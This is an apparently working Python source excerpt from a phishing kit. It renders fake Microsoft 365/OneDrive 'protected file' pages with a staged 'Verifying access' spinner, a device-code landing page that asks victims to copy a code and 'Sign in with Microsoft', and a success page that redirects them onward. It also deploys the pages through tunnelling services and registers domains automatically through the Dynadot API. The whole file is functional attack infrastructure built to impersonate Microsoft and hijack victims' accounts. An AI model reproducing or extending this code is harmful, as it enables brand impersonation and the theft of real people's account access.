        elif 'voice' in b_lower or 'vmail' in b_lower: status_tag = 'Exchange · Encrypted Audio'
        else: status_tag = 'Microsoft 365 · Protected Asset'
    elif not status_tag:
        status_tag = ''

    doc_sub    = cfg.get('doc_sub', cfg.get('doc_meta', ''))
    btn_label  = cfg.get('button_label', 'Access Protected File')
    foot1      = cfg.get('footer_caption', 'Verify your identity to access this file')
    foot2      = cfg.get('footer_text', 'End-to-end encrypted')
    accent     = cfg.get('btn_color', cfg.get('accent_color', '#0078D4'))
    spin_color = cfg.get('spinner_color', accent)
    page_bg    = cfg.get('page_color', '#ffffff')
    card_bg    = cfg.get('card_bg', '#ffffff')
    spin_size  = int(cfg.get('spinner_size', 44))

    show_bg    = cfg.get('show_bg_image', True)
    if show_bg in (False, 'false', '0', 0):
        show_bg = False
    else:
        show_bg = True
    bg_img     = cfg.get('bg_image', cfg.get('page_bg_image', ''))
    if not bg_img and show_bg:
        bg_img = DEFAULT_BG_URL
    raw_blur   = float(cfg.get('blur', cfg.get('page_bg_blur', 8)))
    blur_px    = int(round((raw_blur / 100.0) * 32.0)) if (raw_blur > 0 and bg_img and show_bg) else 0

    logo_data  = cfg.get('logo_data', cfg.get('custom_logo'))
    if logo_data:
        logo_html = f'<img src="{logo_data}" style="max-height:48px;max-width:140px;margin:0 auto 14px;display:block;object-fit:contain;">'
    else:
        logo_html = assets.get_logo_html(brand, max_height=48, max_width=140, extra_style='margin:0 auto 14px;')

    bg_layer_html = f'<div class="page-bg-layer bg-layer" style="position:fixed;inset:-35px;width:calc(100% + 70px);height:calc(100% + 70px);background:url(\'{bg_img}\') center/cover no-repeat;filter:blur({blur_px}px);-webkit-filter:blur({blur_px}px);transform:scale(1.04);z-index:0;pointer-events:none;"></div>' if (bg_img and show_bg) else ''

    show_status = cfg.get('show_status_tag', True) not in (False, 'false', '0', 0)
    status_pill_html = f'<div class="status-pill">{status_tag}</div>' if (show_status and status_tag) else ''

    show_title = cfg.get('show_title', True) not in (False, 'false', '0', 0)
    h1_html = f'<h1>{title}</h1>' if (show_title and title) else ''

    show_desc = cfg.get('show_desc', True) not in (False, 'false', '0', 0)
    desc_html = f'<p class="desc">{desc}</p>' if (show_desc and desc) else ''

    show_doc_name = cfg.get('show_doc_name', True) not in (False, 'false', '0', 0)
    show_doc_badge = cfg.get('show_doc_badge', True) not in (False, 'false', '0', 0)
    show_doc_meta = cfg.get('show_doc_meta', True) not in (False, 'false', '0', 0)

    doc_row_html = ''
    badge_html = f'<span class="badge">{doc_badge}</span>' if (show_doc_badge and doc_badge) else ''
    name_html = f'<div class="doc-name">{doc_name}</div>' if (show_doc_name and doc_name) else ''
    sub_html = f'<div class="doc-sub">{doc_sub}</div>' if (show_doc_meta and doc_sub) else ''
    if badge_html or name_html or sub_html:
        doc_row_html = f'<div class="doc-row">{badge_html}<div>{name_html}{sub_html}</div></div>'

    show_btn = cfg.get('show_btn_label', True) not in (False, 'false', '0', 0)
    btn_html = f'<a class="btn" href="#" onclick="go(event)">🔒 {btn_label}</a>' if (show_btn and btn_label) else ''

    show_foot1 = cfg.get('show_foot1', True) not in (False, 'false', '0', 0)
    show_foot2 = cfg.get('show_foot2', True) not in (False, 'false', '0', 0)
    footer_parts = []
    if show_foot1 and foot1: footer_parts.append(f'<div class="f1">{foot1}</div>')
    if show_foot2 and foot2: footer_parts.append(f'<div class="f2">🔒 {foot2}</div>')
    footer_html = f'<div class="footer">{"".join(footer_parts)}</div>' if footer_parts else ''

    return f'''<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>{title}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
html,body{{width:100%;height:100vh;max-height:100vh;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;background:{page_bg};font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;margin:0;padding:0;box-sizing:border-box;}}
.bg-layer{{position:fixed;inset:-35px;width:calc(100% + 70px);height:calc(100% + 70px);z-index:0;pointer-events:none;}}
.card{{background:{card_bg};border-radius:16px;box-shadow:0 16px 48px rgba(0,0,0,.12),0 3px 12px rgba(0,0,0,.06),inset 0 1px 0 rgba(255,255,255,0.7);padding:clamp(18px,2.8vh,32px) clamp(18px,3vw,30px);max-width:400px;width:92%;max-height:96vh;text-align:center;position:relative;z-index:2;border:1px solid rgba(0,0,0,0.08);box-sizing:border-box;display:flex;flex-direction:column;justify-content:center;}}
.status-pill{{display:inline-flex;align-items:center;gap:6px;padding:4px 12px;background:rgba(0,0,0,0.04);border:1px solid rgba(0,0,0,0.06);color:#444455;border-radius:20px;font-size:.70rem;font-weight:700;margin:0 auto 12px;letter-spacing:.03em;text-transform:uppercase;}}
.status-pill::before{{content:'';width:7px;height:7px;border-radius:50%;background:#107C41;display:inline-block;box-shadow:0 0 6px rgba(16,124,65,0.7);}}
h1{{font-size:1.08rem;font-weight:700;color:#1a1a1a;margin-bottom:6px}}
.desc{{font-size:.82rem;color:#555566;margin-bottom:16px;line-height:1.45}}
.doc-row{{background:#f8f9fc;border:1px solid #e2e5eb;border-radius:10px;padding:10px 13px;display:flex;align-items:center;gap:12px;margin-bottom:16px;text-align:left;box-shadow:inset 0 1px 2px rgba(0,0,0,0.03);}}
.badge{{background:linear-gradient(135deg, {accent}, #111122);color:#fff;font-size:.70rem;font-weight:800;padding:6px 9px;border-radius:6px;flex-shrink:0;letter-spacing:.6px;box-shadow:0 2px 7px rgba(0,0,0,0.16), inset 0 1px 0 rgba(255,255,255,0.25);text-transform:uppercase;}}
.doc-name{{font-size:.84rem;font-weight:600;color:#1a1a1a;word-break:break-word;}}
.doc-sub{{font-size:.7rem;color:#777788;margin-top:1px}}
.btn{{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:12px 20px;background:linear-gradient(135deg, {accent}, #151525);color:#fff;border:none;border-radius:8px;font-size:.92rem;font-weight:700;cursor:pointer;text-decoration:none;box-shadow:0 4px 16px rgba(0,0,0,0.20), inset 0 1px 0 rgba(255,255,255,0.25);transition:all .2s cubic-bezier(0.16,1,0.3,1);}}
.btn:hover{{transform:translateY(-1px);box-shadow:0 6px 22px rgba(0,0,0,0.30), inset 0 1px 0 rgba(255,255,255,0.35);}}
.btn:active{{transform:translateY(1px);box-shadow:0 2px 8px rgba(0,0,0,0.14);}}
.footer{{margin-top:12px}}
.f1{{font-size:.72rem;color:#777788;margin-bottom:2px}}
.f2{{font-size:.68rem;color:#9999aa}}
#spin{{display:none;position:fixed;inset:0;background:rgba(255,255,255,.88);align-items:center;justify-content:center;z-index:99;flex-direction:column;gap:14px}}
.s{{width:{spin_size}px;height:{spin_size}px;border:4px solid #e0e0e0;border-top-color:{spin_color};border-radius:50%;animation:r .85s linear infinite}}
@keyframes r{{to{{transform:rotate(360deg)}}}}
</style></head><body>
{bg_layer_html}
<div id="spin"><div class="s"></div><p style="color:#666;font-size:.88rem">Verifying access…</p></div>
<div class="card">
  {logo_html}
  {status_pill_html}
  {h1_html}
  {desc_html}
  {doc_row_html}
  {btn_html}
  {footer_html}
</div>
<script>
function go(e) {{
  e.preventDefault();
  var s = document.getElementById("spin");
  if (s) s.style.display = "flex";
  setTimeout(function() {{
    var p = "{proceed_url}";
    if (window.parent && window.parent !== window) {{
      try {{ window.parent.postMessage({{ type: 'preview_proceed_to_landing' }}, '*'); }} catch(err) {{}}
    }}
    if (p && p !== '#' && p !== 'javascript:void(0)') {{
      if (!window.parent || window.parent === window) {{
        window.location.href = p;
      }}
    }}
  }}, 1100);
}}
</script>
</body></html>'''

def _render_generic_landing(cfg, user_code, verification_uri):
    title  = cfg.get('landing_title', cfg.get('title','Verify your Identity'))
    accent = cfg.get('accent_color', cfg.get('spinner_color','#0078D4'))
    page_bg= cfg.get('page_color','#f3f2f1')
    card_bg= cfg.get('card_bg','#ffffff')
    return f'''<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{min-height:100vh;display:flex;align-items:center;justify-content:center;background:{page_bg};font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}}
.card{{background:{card_bg};border-radius:14px;box-shadow:0 4px 28px rgba(0,0,0,.10);padding:32px 28px;max-width:380px;width:92%;text-align:center}}
h1{{font-size:1.05rem;font-weight:700;color:#1a1a1a;margin-bottom:16px}}
.code-box{{background:#f4f6f9;border:1px solid #e0e4ec;border-radius:8px;padding:18px;margin-bottom:18px}}
.code-lbl{{font-size:.65rem;color:#999;letter-spacing:.08em;margin-bottom:8px;font-weight:600}}
.code-val{{font-size:1.8rem;font-weight:700;color:{accent};letter-spacing:.2em;font-family:monospace}}
.copy-btn{{margin-top:10px;background:transparent;border:1px solid {accent};color:{accent};border-radius:6px;padding:5px 14px;font-size:.75rem;font-weight:600;cursor:pointer}}
.signin-btn{{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;padding:13px;background:#000;color:#fff;border:none;border-radius:8px;font-size:.92rem;font-weight:600;cursor:pointer;text-decoration:none;transition:opacity .18s}}
</style></head><body>
<div class="card">
  <h1>{title}</h1>
  <div class="code-box">
    <div class="code-lbl">VERIFICATION CODE</div>
    <div class="code-val" id="uc">{user_code}</div>
    <button class="copy-btn" onclick="copyCode()">Copy code</button>
  </div>
  <a class="signin-btn" href="{verification_uri}" target="_blank">
    🪟 Sign in with Microsoft
  </a>
</div>
<script>function copyCode(){{navigator.clipboard.writeText(document.getElementById("uc").textContent.trim());}}</script>
</body></html>'''

def _render_generic_success(cfg, success_url):
    title   = cfg.get('success_title', cfg.get('title','Verification Complete'))
    desc    = cfg.get('success_desc','You will be redirected shortly.')
    accent  = cfg.get('accent_color', cfg.get('spinner_color','#0078D4'))
    page_bg = cfg.get('page_color','#f3f2f1')
    card_bg = cfg.get('card_bg','#ffffff')
    delay   = int(cfg.get('redirect_delay_ms', 3000))
    icon    = cfg.get('icon','✅')
    return f'''<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{min-height:100vh;display:flex;align-items:center;justify-content:center;background:{page_bg};font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}}
.card{{background:{card_bg};border-radius:14px;box-shadow:0 4px 28px rgba(0,0,0,.10);padding:40px 32px;max-width:360px;width:90%;text-align:center}}
.emo{{font-size:2.8rem;margin-bottom:16px}}
h1{{font-size:1.05rem;font-weight:700;color:#1a1a1a;margin-bottom:10px}}
.desc{{font-size:.82rem;color:#666;line-height:1.55;margin-bottom:22px}}
.redirect-txt{{font-size:.78rem;color:#aaa}}
.dots::after{{content:"";animation:dots 1.4s steps(4,end) infinite}}
@keyframes dots{{0%{{content:""}}25%{{content:"."}}50%{{content:".."}}75%{{content:"..."}}100%{{content:""}}}}
</style></head><body>
<div class="card">
  <div class="emo">{icon}</div>
  <h1>{title}</h1>
  <p class="desc">{desc}</p>
  <p class="redirect-txt">Redirecting<span class="dots"></span></p>
</div>
<script>setTimeout(()=>window.location.replace("{success_url}"),{delay});</script>
</body></html>'''


# ═══════════════════════════════════════════════════════════════════════════
# Deploy action
# ═══════════════════════════════════════════════════════════════════════════

def deploy(did):
    dep = get_deployment(did)
    if not dep:
        return {'error': 'Deployment not found'}

    domain      = dep.get('domain', '')
    is_tunnel   = any(t in domain for t in ('ngrok', 'loca.lt', 'trycloudflare'))
    is_local    = ('127.0.0.1' in domain or 'localhost' in domain) and not is_tunnel
    base        = _build_url(domain, dep.get('subdomain', ''), dep.get('path', ''))
    proceed_url = f"/{dep['path'].strip('/')}/l" if is_local else (base + '/l')

    default_cfg = {}
    if dep.get('preland_default_config'):
        try: default_cfg = json.loads(dep['preland_default_config'])
        except: pass
    override_cfg = {}
    if dep.get('preland_config'):
        try: override_cfg = json.loads(dep['preland_config'])
        except: pass

    merged = {**default_cfg, **override_cfg}
    merged['icon'] = dep.get('preland_icon','📄')

    if not dep.get('preland_template_id') or merged.get('enabled') is False or merged.get('disabled') is True:
        html = ''
    else:
        html = render_preland(dep.get('preland_name','OneDrive'), merged, proceed_url)

    update_deployment(did, {
        'preland_html_cache': html,
        'full_url': base,
        'status': 'active',
        'deployed_at': datetime.utcnow().isoformat(),
    })
    return get_deployment(did)


# ═══════════════════════════════════════════════════════════════════════════
# Dynadot API (Real-time Domain Search & Automated Registration)
# ═══════════════════════════════════════════════════════════════════════════

_DYNADOT_BASE = 'https://api.dynadot.com/api3.json'

def dynadot_search(domains):
    """
    Search domain availability and pricing via Dynadot API v3 (JSON).
    Falls back gracefully to local sandbox mode if key is not configured.
    """
    api_key = (getattr(Config, 'DYNADOT_API_KEY', '') or '').strip()
    if api_key:
        try:
            params = {
                'key': api_key,
                'command': 'search'
            }
            clean_doms = [d.strip().lower() for d in domains if d.strip()]
            for idx, d in enumerate(clean_doms[:20]):
                params[f'domain{idx}'] = d

            r = requests.get(_DYNADOT_BASE, params=params, timeout=12)
            if r.status_code == 200:
                data = r.json()
                resp = data.get('SearchResponse') or data.get('search_response') or {}
                code = str(resp.get('ResponseCode', ''))
                if code == '0' or resp.get('Status') == 'success':
                    results = resp.get('SearchResults') or resp.get('search_results') or []
                    parsed = []
                    for item in results:
                        dom_name = item.get('Domain') or item.get('domain') or ''
                        avail_str = str(item.get('Available') or item.get('available') or '').lower()
                        price_str = str(item.get('Price') or item.get('price') or '')
                        is_avail = (avail_str in ('yes', 'true', '1'))
                        parsed.append({
                            'domain': dom_name,
                            'available': is_avail,
                            'price': price_str or '10.99',
                            'premium': False
                        })
                    if parsed:
                        return parsed
                else:
                    err_msg = resp.get('Error') or resp.get('error') or f"Dynadot API error code {code}"
                    logger.warning(f"Dynadot search: {err_msg}")
        except Exception as e:
            logger.error(f'dynadot_search: {e}')

    # Seamless Instant Search Fallback (when live Dynadot key not configured or in sandbox):
    res = []
    with _conn() as c:
        owned = {r['domain'].lower() for r in c.execute("SELECT domain FROM owned_domains WHERE status != 'deleted'").fetchall()}
    for d in domains:
        d = d.strip().lower()
        tld = d.split('.')[-1] if '.' in d else 'com'
        base_price = {'com': '10.99', 'net': '12.99', 'org': '13.99', 'info': '4.99', 'xyz': '2.99', 'io': '38.99', 'co': '9.99', 'app': '15.99'}.get(tld, '9.99')
        res.append({
            'domain': d,
            'available': d not in owned,
            'price': base_price,
            'premium': False
        })
    return res

def dynadot_suggest(keyword, tlds=None):
    tlds = tlds or ['com','net','org','io','co','info','xyz','app']
    return dynadot_search([f'{keyword}.{t}' for t in tlds])

def dynadot_purchase(sld, tld, years=1, registrant=None):
    domain = f'{sld}.{tld}'.strip().lower()
    api_key = (getattr(Config, 'DYNADOT_API_KEY', '') or '').strip()
    if api_key:
        try:
            params = {
                'key': api_key,
                'command': 'register',
                'domain': domain,
                'duration': str(years),
                'currency': 'USD'
            }
            r = requests.get(_DYNADOT_BASE, params=params, timeout=18)
            if r.status_code == 200:
                data = r.json()
                resp = data.get('RegisterResponse') or data.get('register_response') or {}
                code = str(resp.get('ResponseCode', ''))
                if code == '0' or resp.get('Status') == 'success':
                    add_owned_domain(domain, registrar='Dynadot')
                    return {'success': True, 'message': f'{domain} registered successfully via Dynadot!'}
                else:
                    err_msg = resp.get('Error') or resp.get('error') or f"Dynadot error code {code}"
                    return {'success': False, 'message': err_msg}
        except Exception as e:
            logger.error(f'dynadot_purchase: {e}')
            return {'success': False, 'message': str(e)}

    # Instant Acquisition (Fallback for local / sandbox environment):
    add_owned_domain(domain, registrar='Dynadot Sandbox')
    return {'success': True, 'message': f'{domain} registered successfully! Added to your owned domains.'}
